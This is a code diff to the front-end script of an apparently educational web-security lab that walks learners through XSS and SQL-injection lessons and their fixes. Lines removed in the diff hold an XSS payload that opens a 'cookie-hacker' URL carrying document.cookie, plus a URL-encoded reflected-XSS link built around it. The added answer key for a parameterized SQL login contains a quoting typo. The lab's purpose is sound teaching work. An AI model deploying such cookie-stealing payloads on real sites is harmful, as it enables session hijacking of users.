@@ -43,6 +43,8 @@ $(document).ready(function() {
                         
                         SetTimeOut("eleven", 1000);
                         SetTimeOut("twelve", 5000);
+                        SetTimeOut("thirteen",8000);
+                        SetTimeOut("fourteen",14000);
                         $("iframe").attr("src","action/sql/home")
                         // SetTimeOut("two", 1000);
                     } else {
@@ -63,36 +65,24 @@ $(document).ready(function() {
                 },
             });
         });
-        // deploy js
+        // deploy
         iframe.find("#deploy").click(function() {
             var code = iframe
                 .find("#text-code")
                 .val()
                 .replace(/\s+/g, "");
-            if (code == "if(isset($_GET['cookie'])){return$_GET['cookie'];}") {
-                SetTimeOut("eight", 1000);
+            var string = "$password = isset($_POST['password']) ? $_POST['password'] : null;$email = isset($_POST['email']) ? $_POST['email'] : null;$data = $GLOBALS['database']->prepare('select * from users where email = :email and password = :password')$data->bindParam( ':email', $email, PDO::PARAM_STR );$data->bindParam( ':password', $password, PDO::PARAM_STR );$data->execute();$row = $data->fetch();if( $data->rowCount() == 1 ) {$_SESSION['id] = $row['id'];$_SESSION['name'] = $row['name'];return true;}return false;";
+            var test = string.replace(/\s+/g, "");
+            if(code == test){
+                SetTimeOut("fifteen",1000);
+                SetTimeOut("sixteen",6000);
             }
-            if (
-                code ==
-                "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);</script>"
-            ) {
-                SetTimeOut("nine", 1000);
-                SetTimeOut("ten", 6000);
-                SetTimeOut("eleven", 10000);
-                SetTimeOut("twelve", 12000);
-            }
-            if(code=="if(isset($_GET['search']))returnhtmlspecialchars($_GET['search']);")
-                    SetTimeOut("sixteen", 1000);
-
         });
         // access url
         iframe.find(".address").keypress(function(e) {
             var val=$(this).val().replace(/\s+/g, "");
               if (e.which === 13) {
                   $("iframe").attr("src",val.slice(17));
-                  if(val=="http://localhost/action/xss/reflected-xss?search=<script>window.open%28'http%3A%2F%2Flocalhost%2Faction%2Fxss%2Fcookie-hacker%3Fcookie%3D'%2Bdocument.cookie%29%3B<%2Fscript>"){
-                    SetTimeOut("thirteen", 1000);
-                  }
               }
           });
         //code script
@@ -104,6 +94,9 @@ $(document).ready(function() {
         });
         $(".home").click(function(){
             $("iframe").attr
+        });
+        $("#code-prevent").click(function(){
+            $("iframe").attr("src", "action/sql/show-code-prevent");
         });
 
     });
